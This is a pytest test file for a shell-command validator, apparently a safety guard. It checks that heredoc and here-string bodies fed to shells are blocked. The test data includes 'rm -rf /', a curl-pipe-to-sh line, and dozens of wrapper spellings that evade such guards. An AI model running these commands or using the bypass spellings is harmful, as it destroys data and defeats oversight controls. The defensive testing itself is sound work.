"""LAB-5180: heredoc/here-string owner uncertainty fails closed.

The heredoc owner is what decides whether a heredoc body is inert text or code a shell runs. It
missed expansion-spelled shells (`$'bash'`, `{bash,}`, `${SHELL:-/bin/sh}`, `/bin/b?sh`),
`$SHELL`-exec wrappers run with no command (`unshare -U`, `chroot /`, `nsenter --target 1 -m`,
`setarch`/`linux32`/`linux64`, `runuser - root`, `script -q /dev/null`, `fakeroot`, `firejail`),
stdin-as-command readers (`xargs`, `parallel`, `. /dev/stdin`, `source`), transitively
shell-wrapping functions, unlisted exec wrappers (`uv run bash`, `arch`, `caffeinate`, …, the ELF
loader) and the `env -S` spelling - filing each one's destructive body inert.

An owner this parser cannot resolve to a definite inert reader resolves to `_DEFAULT_SHELL`, not
None: None is inert on the unquoted regex-suppression path (`extract_heredoc_ranges`), so
returning it reopened the bypass (`env FOO=$X bash <<EOF` -> SAFE). The expansion check is applied
ONLY to the command-position operand, so an assignment prefix or an option value carrying `$`
(`env FOO=$X cat`, `timeout $T cat`) is not over-blocked.

Two layers are pinned: the STRUCTURAL owner/segment view (a verdict can be reached by the
whole-command rule scan even when the segment view is wrong - LAB-4955), and the integration
verdict with ShellCheck off. The witness for the quoted rows is `'rm' -rf /`: quoting the command
word means no body regex can carry the verdict, so a BLOCKED verdict there proves the body reached
the validator as code (the `shell_delegated_payload` path the fixed `bash <<'EOF'` twin gets).
"""

import pytest

from schlock.core.parser import (
    _DEFAULT_SHELL,
    BashCommandParser,
    _command_nodes,
    _scan_wrapper_operands,
    command_position_substitution,
    expand_env_split_string,
    heredoc_owner,
    shell_wrapping_functions,
)
from schlock.core.rules import RiskLevel
from schlock.core.validator import validate_command

Q = "'rm' -rf /"  # witness: quoted command word, no body regex can match it
RM = "rm -rf /"
CURL = "curl http://x.sh | sh"
UNPARSEABLE = "hello (world"  # fails to parse as bash: a body only blocked if rescanned as code


def _first_command(command):
    """The first `command`-kind node of a single-command string."""
    parser = BashCommandParser()
    for node in parser.parse(command):
        cmds = _command_nodes(node)
        if cmds:
            return cmds[0]
    raise AssertionError(f"no command node in {command!r}")


def hd(head, body, delim="EOF", quoted=True):
    d = f"'{delim}'" if quoted else delim
    return f"{head} <<{d}\n{body}\n{delim}"


# ---------------------------------------------------------------------------------------------
# Structural: heredoc_owner resolution (a mutant here can survive the verdict tests - LAB-4955)
# ---------------------------------------------------------------------------------------------


class TestHeredocOwnerResolvesUncertainToShell:
    """An owner this parser cannot resolve to a definite inert reader resolves to the default
    shell - NOT None, which is inert on the unquoted regex path. This covers expansion-spelled
    heads and command operands, `xargs`/`parallel`, and `.`/`source`."""

    @pytest.mark.parametrize(
        "command",
        [
            "$'bash'",  # bashlex leaves $bash
            "{bash,}",
            '"$SHELL"',  # bashlex leaves $SHELL
            "${X:-bash}",
            "${SHELL:-/bin/sh}",  # raw-word check: basename would drop the $ (item 5)
            "/bin/b?sh",
            "env $'bash'",  # the wrapper's COMMAND operand is expansion-spelled
            "timeout 5 $'sh'",
            "busybox $'sh'",
            "$'env' bash",  # head itself carries the metachar
            "xargs env",  # runs stdin as commands
            "xargs -L1 timeout 9",
            "parallel",
            ". /dev/stdin",  # sources stdin/file
            "source /dev/stdin",
        ],
    )
    def test_owner_is_default_shell(self, command):
        assert heredoc_owner(_first_command(command)) == _DEFAULT_SHELL

    def test_no_command_words_is_none(self):
        # The only None case: a command node with no words at all.
        assert heredoc_owner(_first_command("x=1")) is None


class TestHeredocOwnerDefaultShellWrappers:
    """A `$SHELL`-exec wrapper run with NO command operand runs the default shell on its stdin -
    including long-option and short-cluster spellings (item 3)."""

    @pytest.mark.parametrize(
        "command",
        [
            "unshare -U",
            "unshare -r",
            "unshare --root /",  # long value option consumes /
            "unshare -rS 0",  # short cluster: -r flag, -S consumes 0
            "chroot /",
            "chroot --userspec 0:0 /",
            "runuser - root",
            "script -q /dev/null",
            "nsenter -t 1 -m",
            "nsenter --target 1 -m",  # long spelling of the short AC1 row
            "setarch x86_64",
            "linux32",
            "linux64",
            "i386",  # setarch personality alias
            "uname26",
            "fakeroot",  # should-fix: no program -> user's shell
            "firejail",
        ],
    )
    def test_owner_is_default_shell(self, command):
        assert heredoc_owner(_first_command(command)) == _DEFAULT_SHELL

    def test_unknown_option_fails_closed_to_shell(self):
        # An option unknown to a $SHELL-exec wrapper resolves to the shell, not a guessed flag.
        assert heredoc_owner(_first_command("unshare --frobnicate cat")) == _DEFAULT_SHELL


class TestHeredocOwnerResolvesWrappedShell:
    """A wrapper with an explicit shell operand names that shell, wherever the shell sits."""

    @pytest.mark.parametrize(
        "command,expected",
        [
            ("env bash", "bash"),
            ("timeout 5 sh", "sh"),
            ("env FOO=$X bash", "bash"),  # shell found past an assignment carrying $
            ("nice -n $N bash", "bash"),  # shell found past an option value carrying $
            ("/lib64/ld-linux-x86-64.so.2 /bin/bash", "bash"),  # ELF loader
        ],
    )
    def test_owner_names_the_shell(self, command, expected):
        assert heredoc_owner(_first_command(command)) == expected


class TestHeredocOwnerInertReadersUnchanged:
    """Controls: a definite inert reader still names itself. A `$SHELL`-exec wrapper WITH a command
    operand names the wrapper, not the shell - the body is not rescanned as a program (AC7). An
    assignment prefix or option value carrying `$` does not force the body to code (item 2)."""

    @pytest.mark.parametrize(
        "command,expected",
        [
            ("cat", "cat"),
            ("grep foo", "grep"),
            ("tee out.txt", "tee"),
            ("timeout 5 cat", "timeout"),
            ("timeout $T cat", "timeout"),  # $T is the DURATION, not the command (item 2)
            ("env FOO=$X cat", "env"),  # assignment carries $, command is cat (item 2)
            ("env DATABASE_URL=$DB psql", "env"),
            ("unshare cat", "unshare"),
            ("unshare -r cat", "unshare"),
            ("chroot / cat", "chroot"),
            ("chroot /mnt tee /etc/fstab", "chroot"),
            ("bash", "bash"),
            ("/bin/bash", "bash"),
            ("su root -c id", "su"),  # -c escape: stdin is data, su is inert here
        ],
    )
    def test_owner_is_the_reader(self, command, expected):
        assert heredoc_owner(_first_command(command)) == expected


class TestScanWrapperOperands:
    """The option-arity scanner locates the first COMMAND operand: present -> (op, False),
    absent -> (None, runs_default_shell). Long options, short clusters and env assignments (item 3)."""

    @pytest.mark.parametrize(
        "base,operands,cmd_op,runs_shell",
        [
            ("unshare", ["-U"], None, True),
            ("unshare", ["-r"], None, True),
            ("unshare", ["cat"], "cat", False),
            ("unshare", ["-r", "cat"], "cat", False),
            ("unshare", ["--root", "/"], None, True),  # long value option
            ("unshare", ["-rS", "0"], None, True),  # short cluster consumes 0
            ("unshare", ["--frobnicate", "cat"], None, True),  # unknown option -> fail closed
            ("nsenter", ["-t", "1", "-m"], None, True),
            ("nsenter", ["--target", "1", "-m"], None, True),
            ("nsenter", ["-t", "1", "bash"], "bash", False),
            ("chroot", ["/"], None, True),
            ("chroot", ["/", "cat"], "cat", False),
            ("chroot", ["--userspec", "0:0", "/"], None, True),
            ("chroot", ["/mnt", "tee", "/etc/fstab"], "tee", False),
            ("setarch", ["x86_64"], None, True),
            ("setarch", ["x86_64", "cat"], "cat", False),
            ("linux32", [], None, True),
            ("runuser", ["-", "root"], None, True),
            ("runuser", ["-", "root", "cat"], "cat", False),
            ("runuser", ["root", "-c", "id"], None, False),  # -c escape
            ("su", ["root"], None, True),
            ("su", ["root", "cat"], "cat", False),
            ("script", ["-q", "/dev/null"], None, True),  # file positional, not a command
            ("script", ["-c", "id", "/dev/null"], None, False),  # -c escape
            ("timeout", ["$T", "cat"], "cat", False),  # DURATION then command
            ("timeout", ["5"], None, False),  # not a $SHELL-exec wrapper
            ("env", ["FOO=1", "cat"], "cat", False),  # assignment skipped
            ("env", ["FOO=1"], None, False),
        ],
    )
    def test_scan(self, base, operands, cmd_op, runs_shell):
        assert _scan_wrapper_operands(base, operands) == (cmd_op, runs_shell)


class TestEnvSplitStringExpansion:
    @pytest.mark.parametrize(
        "args,expected",
        [
            (["-S", "bash -e"], ["bash", "-e"]),
            (["-Sbash"], ["bash"]),
            (["--split-string=bash -c foo"], ["bash", "-c", "foo"]),
            (["FOO=1", "bash"], ["FOO=1", "bash"]),  # untouched without -S
        ],
    )
    def test_env_expansion(self, args, expected):
        assert expand_env_split_string("env", args) == expected

    def test_non_env_untouched(self):
        assert expand_env_split_string("timeout", ["-S", "bash -e"]) == ["-S", "bash -e"]


class TestShellWrappingFunctions:
    @pytest.mark.parametrize(
        "command,expected",
        [
            ("f() { bash; }; f", {"f"}),
            ("g() { unshare -U; }; g", {"g"}),  # runs the default shell
            ("h() { cat; }; h", set()),  # inert body
            ("cat file", set()),  # no function
            ("g() { bash; }; f() { g; }; f", {"g", "f"}),  # transitive (item 4)
            ("f() { g; }; g() { bash; }; f", {"g", "f"}),  # forward call, declaration order (item 4)
        ],
    )
    def test_detects_shell_wrapping_functions(self, command, expected):
        parser = BashCommandParser()
        assert shell_wrapping_functions(parser.parse(command)) == expected


class TestCommandPositionSubstitution:
    """A command substitution whose OUTPUT is executed is in command position; an assignment RHS or
    an argument is not. Pins the node found, not just its presence."""

    def _sub(self, command):
        return command_position_substitution(_first_command(command))

    @pytest.mark.parametrize("command", ["$(cat file)", "`cat file`", "$(cat file) arg"])
    def test_command_position_returns_the_sub_node(self, command):
        sub = self._sub(command)
        assert sub is not None and getattr(sub, "kind", None) == "commandsubstitution"

    @pytest.mark.parametrize("command", ["x=$(cat file)", "echo $(cat file)", 'git commit -m "$(cat file)"'])
    def test_non_command_position_is_none(self, command):
        assert self._sub(command) is None


class TestProcsubHeredocRangesAreShell:
    """A heredoc under an unquoted process substitution is is_shell=True in extract_heredoc_ranges
    - the reader of `<( … )` may run what it prints. Pinned structurally: the whole-command scan
    would block these anyway, masking a regression in the range view (LAB-4955)."""

    @pytest.mark.parametrize(
        "command",
        [
            "bash <(cat <<EOF\nrm -rf /\nEOF\n)",
            "source <(cat <<EOF\nrm -rf /\nEOF\n)",
            ". <(cat <<EOF\nrm -rf /\nEOF\n)",
            "bash <(cat <<EOF\nrm -rf /\nEOF\n) | wc -l",
        ],
    )
    def test_procsub_heredoc_is_shell(self, command):
        parser = BashCommandParser()
        ranges = parser.extract_heredoc_ranges(command, parser.parse(command))
        assert ranges, f"no heredoc range for {command!r}"
        assert all(is_shell for _s, _e, is_shell in ranges), ranges


class TestBusyboxPathShellHereString:
    """AC3: `_classify_sink` basenames the resolved multicall applet, so `busybox /bin/sh <<< X`
    surfaces the same stdin program as `busybox sh <<< X`."""

    def _extract(self, command):
        parser = BashCommandParser()
        return parser.extract_stdin_program_redirects(parser.parse(command))

    def test_busybox_path_shell_resolves_to_applet(self):
        assert self._extract('busybox /bin/sh <<< "rm -rf /"') == [("sh", "rm -rf /")]

    def test_busybox_bare_applet_still_resolves(self):
        assert self._extract('busybox sh <<< "rm -rf /"') == [("sh", "rm -rf /")]


# ---------------------------------------------------------------------------------------------
# Integration verdicts (ShellCheck off). Quoted rows must reach shell_delegated_payload.
# ---------------------------------------------------------------------------------------------

AC1_QUOTED_ROWS = [
    "$'bash'",
    "{bash,}",
    '"$SHELL"',
    "${X:-bash}",
    "${SHELL:-/bin/sh}",
    "/bin/b?sh",
    "env $'bash'",
    "timeout 5 $'sh'",
    "busybox $'sh'",
    "$'env' bash",
    "env FOO=$X bash",  # assignment-prefix operand carrying $ (regression witness, item 1)
    "unshare -U",
    "unshare -r",
    "unshare --root /",
    "unshare -rS 0",
    "chroot /",
    "chroot --userspec 0:0 /",
    "runuser - root",
    "script -q /dev/null",
    "nsenter -t 1 -m",
    "nsenter --target 1 -m",
    "setarch x86_64",
    "linux32",
    "linux64",
    "fakeroot",
    "firejail",
    "xargs env",
    "xargs -L1 timeout 9",
    "parallel",
    "uv run bash",
    "fakeroot bash",
    "firejail bash",
    "arch -x86_64 bash",
    "caffeinate bash",
    "prlimit bash",
    "dbus-run-session bash",
    "/lib64/ld-linux-x86-64.so.2 /bin/bash",
    ". /dev/stdin",
    "source /dev/stdin",
    "env -S 'bash -e'",
    "env -Sbash",
    "env --split-string=bash",
]


class TestAc1QuotedHeredocRowsBlocked:
    @pytest.mark.parametrize("head", AC1_QUOTED_ROWS)
    def test_quoted_heredoc_blocked_structurally(self, head, no_shellcheck):
        result = validate_command(hd(head, Q))
        assert result.risk_level == RiskLevel.BLOCKED, f"{head!r} -> {result.risk_level.name}"
        # The verdict comes from the structural path, not a body regex (the body is quote-broken).
        rules = result.matched_rules or []
        assert "shell_delegated_payload" in rules or "Cannot" in (result.message or ""), (head, rules, result.message)
        assert "system_destruction" not in rules and "recursive_delete" not in rules, (head, rules)

    @pytest.mark.parametrize(
        "command",
        [
            "f() { bash; }; " + hd("f", Q),  # direct wrapping function
            "g() { bash; }; f() { g; }; " + hd("f", Q),  # transitive (item 4)
        ],
    )
    def test_shell_wrapping_function_blocked(self, command, no_shellcheck):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_direct_twin_is_the_floor(self, no_shellcheck):
        twin = validate_command(hd("bash", Q))
        assert twin.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (twin.matched_rules or [])


class TestAc1UnquotedRegressionTwins:
    """The CRIT regression: a None owner was inert on the unquoted path. Every uncertain owner over
    an UNQUOTED `rm -rf /` body must reach the direct `bash <<EOF` twin's BLOCKED (item 1)."""

    @pytest.mark.parametrize(
        "head",
        [
            "env FOO=$X bash",
            'timeout "${T:-5}" bash',
            "nice -n $N bash",
            'stdbuf -o"$M" bash',
            "$'bash'",
            "xargs env",
            ". /dev/stdin",
            "source /dev/stdin",
        ],
    )
    def test_unquoted_twin_blocked(self, head, no_shellcheck):
        result = validate_command(hd(head, RM, quoted=False))
        assert result.risk_level == RiskLevel.BLOCKED, f"{head!r} -> {result.risk_level.name}"


class TestAc2DashCPayloads:
    @pytest.mark.parametrize(
        "command",
        [
            "env $'bash' -c 'rm -rf /'",
            "env -S 'bash -c \"rm -rf /\"'",
        ],
    )
    def test_dash_c_payload_blocked(self, command, no_shellcheck):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert "shell_delegated_payload" in (result.matched_rules or [])

    @pytest.mark.parametrize(
        "command",
        [
            "timeout $T python3 -c 'print(1)'",  # -c belongs to python3, not the unresolved word
            "env DATABASE_URL=$DB psql -c 'select 1'",
        ],
    )
    def test_dash_c_of_another_program_not_extracted(self, command, no_shellcheck):
        # SAFE on base; the review's item-2 over-block must not reappear.
        assert validate_command(command).risk_level == RiskLevel.SAFE, command


class TestAc3HereStringDrift:
    @pytest.mark.parametrize("body", [RM, Q])
    def test_busybox_path_shell_matches_bash(self, body, no_shellcheck):
        busybox = validate_command(f'busybox /bin/sh <<< "{body}"')
        bash = validate_command(f'bash <<< "{body}"')
        assert busybox.risk_level == bash.risk_level == RiskLevel.BLOCKED, (body, busybox.risk_level, bash.risk_level)


class TestAc4UnquotedRowsMatchDirectTwin:
    """Parity with the direct unquoted twin `bash <<EOF` (regex over the raw body); structural
    validation of unquoted bodies is out of scope."""

    @pytest.mark.parametrize(
        "command",
        [
            "bash <(cat <<EOF\n{body}\nEOF\n)",
            "source <(cat <<EOF\n{body}\nEOF\n)",
            ". <(cat <<EOF\n{body}\nEOF\n)",
            "unshare <<EOF\n{body}\nEOF",
            "chroot / <<EOF\n{body}\nEOF",
            "script -q /dev/null <<EOF\n{body}\nEOF",
        ],
    )
    @pytest.mark.parametrize("body", [RM, CURL])
    def test_unquoted_row_blocked(self, command, body, no_shellcheck):
        result = validate_command(command.format(body=body))
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r}/{body!r} -> {result.risk_level.name}"


class TestAc5CommandPosition:
    def test_command_position_dollar_blocked(self, no_shellcheck):
        result = validate_command("$(cat <<'EOF'\n" + Q + "\nEOF\n)")
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_command_position_backtick_blocked(self, no_shellcheck):
        result = validate_command("`cat <<'EOF'\n" + Q + "\nEOF\n`")
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_assignment_rhs_keeps_verdict(self, no_shellcheck):
        # Data, not a command: stays SAFE (its a72b45c verdict).
        result = validate_command("x=$(cat <<'EOF'\n" + Q + "\nEOF\n)")
        assert result.risk_level == RiskLevel.SAFE

    def test_commit_message_argument_keeps_verdict(self, no_shellcheck):
        # `git commit -m "$(...)"` took the fallback pre-change and stays BLOCKED there.
        result = validate_command("git commit -m \"$(cat <<'EOF'\n" + Q + '\nEOF\n)"')
        assert result.risk_level == RiskLevel.BLOCKED


class TestAc6OverBlockGuidance:
    def test_git_commit_file_procsub_points_at_stdin(self, no_shellcheck):
        result = validate_command("git commit -F <(cat <<'EOF'\nfix: it's done\nEOF\n)")
        assert result.risk_level == RiskLevel.BLOCKED
        assert any("-F -" in alt for alt in result.alternatives), result.alternatives

    def test_gh_body_file_procsub_points_at_stdin(self, no_shellcheck):
        result = validate_command("gh pr create --body-file <(cat <<'EOF'\nDoesn't break\nEOF\n)")
        assert result.risk_level == RiskLevel.BLOCKED
        assert any("--body-file -" in alt for alt in result.alternatives), result.alternatives

    def test_stdin_spellings_keep_verdicts(self, no_shellcheck):
        # `-F -` / `--body-file -` are allowed; the guidance points here.
        assert validate_command("git commit -F - <<'EOF'\nfix: it's done\nEOF").allowed is True
        assert validate_command("gh pr create --body-file - <<'EOF'\nDoesn't break\nEOF").allowed is True


class TestAc7InertControlsUnchanged:
    """Benign bodies stay allowed; a `$SHELL`-exec wrapper WITH a command operand does not rescan
    its body as a program. The body `hello (world` fails to parse as bash, so a wrongly-rescanned
    body would BLOCK - the test really pins "not rescanned as code", not "the body is harmless"."""

    @pytest.mark.parametrize(
        "command,risk",
        [
            ("cat", RiskLevel.SAFE),
            ("grep foo", RiskLevel.SAFE),
            ("timeout 5 cat", RiskLevel.SAFE),
            ("timeout $T cat", RiskLevel.SAFE),
            ("env FOO=$X cat", RiskLevel.SAFE),
            ("unshare cat", RiskLevel.SAFE),
            ("unshare -r cat", RiskLevel.SAFE),
            ("chroot / cat", RiskLevel.SAFE),
            ("tee out.txt", RiskLevel.HIGH),  # file_truncation, but allowed
            ("chroot /mnt tee /etc/fstab", RiskLevel.HIGH),
        ],
    )
    def test_benign_body_stays_allowed(self, command, risk, no_shellcheck):
        result = validate_command(hd(command, UNPARSEABLE))
        assert result.risk_level == risk, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is True


class TestLauncherExecEvalNotBypassScanned:
    """Item 2c: launchers whose own subcommand is `exec`/`eval` are out of the wrapper-bypass scan,
    so a benign `uv run … exec` / `firejail … eval` is not read as the shell builtin."""

    @pytest.mark.parametrize("command", ["uv run pytest -k exec", "firejail --noprofile make eval"])
    def test_launcher_subcommand_not_blocked(self, command, no_shellcheck):
        assert validate_command(command).risk_level != RiskLevel.BLOCKED, command
